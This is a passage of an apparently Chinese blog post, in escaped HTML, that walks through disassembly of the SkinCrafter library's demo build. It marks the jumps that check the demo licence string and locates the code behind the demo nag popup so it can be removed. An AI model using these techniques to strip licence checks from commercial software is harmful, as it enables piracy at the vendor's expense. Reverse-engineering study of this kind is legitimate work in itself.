&lt;span class="nt"&gt;10005A4B&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;75&lt;/span&gt; &lt;span class="nt"&gt;48&lt;/span&gt;         &lt;span class="nt"&gt;jnz&lt;/span&gt; &lt;span class="nt"&gt;XSkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10005A95&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="err"&gt;第一次跳转判断&lt;/span&gt;
&lt;span class="nt"&gt;10005A4D&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B45&lt;/span&gt; &lt;span class="nt"&gt;14&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;arg.4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;10005A50&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;8C420610&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1006428C&lt;/span&gt;                &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;DEMOSKINCRAFTERLICENCE&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;10005A7A&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;85C0&lt;/span&gt;          &lt;span class="nt"&gt;test&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;10005A7C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;75&lt;/span&gt; &lt;span class="nt"&gt;17&lt;/span&gt;         &lt;span class="nt"&gt;jnz&lt;/span&gt; &lt;span class="nt"&gt;XSkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10005A95&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="err"&gt;第二次跳转判断&lt;/span&gt;
&lt;span class="nt"&gt;10005A7E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;5E&lt;/span&gt;            &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;10005A7F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;B8&lt;/span&gt; &lt;span class="nt"&gt;01000000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x1&lt;/span&gt;
&lt;span class="nt"&gt;10005A84&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;5B&lt;/span&gt;            &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
&lt;span class="nt"&gt;10005A85&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8B4D&lt;/span&gt; &lt;span class="nt"&gt;FC&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;10005A88&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33CD&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;10005A8A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;E91E0500&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10057978&lt;/span&gt;
&lt;span class="nt"&gt;10005A8F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8BE5&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;10005A91&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;5D&lt;/span&gt;            &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;10005A92&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C2&lt;/span&gt; &lt;span class="nt"&gt;1000&lt;/span&gt;       &lt;span class="nt"&gt;retn&lt;/span&gt; &lt;span class="nt"&gt;0x10&lt;/span&gt;
&lt;span class="nt"&gt;10005A95&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x0&lt;/span&gt;                                 &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Style&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;MB_OK&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;MB_APPLMODAL&lt;/span&gt;
&lt;span class="nt"&gt;10005A97&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;80420610&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10064280&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;SkinCrafter&lt;/span&gt;
&lt;span class="nt"&gt;10005A9C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;D8410610&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;100641D8&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;You&lt;/span&gt; &lt;span class="nt"&gt;are&lt;/span&gt; &lt;span class="nt"&gt;using&lt;/span&gt; &lt;span class="nt"&gt;DEMO&lt;/span&gt; &lt;span class="nt"&gt;version&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;SkinCrafter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;InitLicenKeys&lt;/span&gt; &lt;span class="nt"&gt;function&lt;/span&gt; &lt;span class="nt"&gt;parameters&lt;/span&gt; &lt;span class="nt"&gt;should&lt;/span&gt; &lt;span class="nt"&gt;be&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;SKINCRAFTER&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;SKINCRAFTER&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;COM&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;support&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;skincrafter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;DEMOSKINCRAFTERLICENCE&lt;/span&gt;
&lt;span class="nt"&gt;10005AA1&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;00&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x0&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hOwner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;NULL&lt;/span&gt;
&lt;span class="nt"&gt;10005AA3&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;4C350610&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.MessageBoxA&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;MessageBoxA&lt;/span&gt;
&lt;span class="nx"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;去除弹出框&lt;/h1&gt;
&lt;p&gt;最明显的莫过于这个弹出框，程序启动后就会出现。该弹出框无边框可拖动，而且强制置顶（TOP_MOST），因此想到SetWindowPos()及SetWindowLong()两个函数，仔细查找后均无果。后来又查找了CreateWindow()、CreateRectRgn()及CreateRectRgnIndirect()也没有很好的下手位置。就在找函数这条思路没有突破口的时候，看到弹出窗口上有一条可以点击的网址，因此直接查字符串找这个网址，然后跳转到程序处。&lt;/p&gt;
&lt;p&gt;找到程序处之后翻看上下文，无非就在load一些资源，突然看到ShowWindow()函数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;10002F40&lt;/span&gt;  &lt;span class="o"&gt;/$&lt;/span&gt;  &lt;span class="nt"&gt;55&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;10002F41&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8BEC&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esp&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;10002F87&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;F3000000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0xF3&lt;/span&gt;
&lt;span class="nt"&gt;10002F8C&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;02&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x2&lt;/span&gt;
&lt;span class="nt"&gt;10002F8E&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;F3000000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0xF3&lt;/span&gt;
&lt;span class="nt"&gt;10002F93&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;D6410500&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;mfc100&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;AfxFindResourceHandle_1900&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;10002F98&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;                                             &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;hInst&lt;/span&gt;
&lt;span class="nt"&gt;10002F99&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;70350610&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;USER32.LoadBitmapW&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;            &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;LoadBitmapW&lt;/span&gt;
&lt;span class="nt"&gt;10002F9F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;50&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;10002FA0&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;CC450710&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;100745CC&lt;/span&gt;
&lt;span class="nt"&gt;10002FA5&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;BE410500&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;mfc100&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;CGdiObject&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="nd"&gt;Attach_2184&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;10002FAA&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;D0450710&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x100745D0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;10002FAF&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;A3&lt;/span&gt; &lt;span class="nt"&gt;D85F0710&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x10075FD8&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;10002FB4&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;391D&lt;/span&gt; &lt;span class="nt"&gt;DC5F0710&lt;/span&gt; &lt;span class="nt"&gt;cmp&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x10075FDC&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ebx&lt;/span&gt;
&lt;span class="nt"&gt;10002FBA&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;0F85&lt;/span&gt; &lt;span class="nt"&gt;7C020000&lt;/span&gt; &lt;span class="nt"&gt;jnz&lt;/span&gt; &lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1000323C&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;10003143&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;A1&lt;/span&gt; &lt;span class="nt"&gt;E05F0710&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x10075FE0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;10003148&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;01&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x1&lt;/span&gt;
&lt;span class="nt"&gt;1000314A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;51&lt;/span&gt;            &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;1000314B&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8BCC&lt;/span&gt;          &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esp&lt;/span&gt;
&lt;span class="nt"&gt;1000314D&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8965&lt;/span&gt; &lt;span class="nt"&gt;DC&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt;&lt;span class="mf"&gt;.9&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;esp&lt;/span&gt;
&lt;span class="nt"&gt;10003150&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;843D0610&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;SkinCraf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10063D84&lt;/span&gt;                               &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;www&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;skincrafter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;order&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;html&lt;/span&gt;
&lt;span class="nt"&gt;10003155&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C780&lt;/span&gt; &lt;span class="nt"&gt;84000000&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x84&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x497D&lt;/span&gt;
&lt;span class="nt"&gt;1000315F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;FF15&lt;/span&gt; &lt;span class="nt"&gt;A4390610&lt;/span&gt; &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;mfc100.&lt;/span&gt;&lt;span class="vi"&gt;#ATL&lt;/span&gt;&lt;span class="nl"&gt;::CStringT&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;StrT&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="nx"&gt;mfc100.&lt;/span&gt;&lt;span class="vi"&gt;#ATL&lt;/span&gt;&lt;span class="nl"&gt;::CStringT&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;StrTraitMFC_DLL&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;ATL&lt;/span&gt;&lt;span class="nl"&gt;::ChTraitsCRT&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nl"&gt;::CStringT&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;StrTraitMFC_DLL&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;ATL&lt;/span&gt;&lt;span class="nl"&gt;::ChTraitsCRT&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;_310&lt;/span&gt;
&lt;span class="mi"&gt;10003165&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="nx"&gt;B0D&lt;/span&gt; &lt;span class="nx"&gt;E05F0710&lt;/span&gt; &lt;span class="nx"&gt;mov&lt;/span&gt; &lt;span class="nx"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;dword&lt;/span&gt; &lt;span class="nx"&gt;ptr&lt;/span&gt; &lt;span class="nx"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x10075FE0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;1000323C&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;8B0D&lt;/span&gt; &lt;span class="nt"&gt;DC5F0710&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ds&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x10075FDC&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;10003242&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;6A&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;         &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;0x5&lt;/span&gt;
&lt;span class="nt"&gt;10003244&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;35410500&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;jmp&lt;/span&gt;&lt;span class="o"&gt;.&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;mfc100&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;CWnd&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="nd"&gt;ShowWindow_12962&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


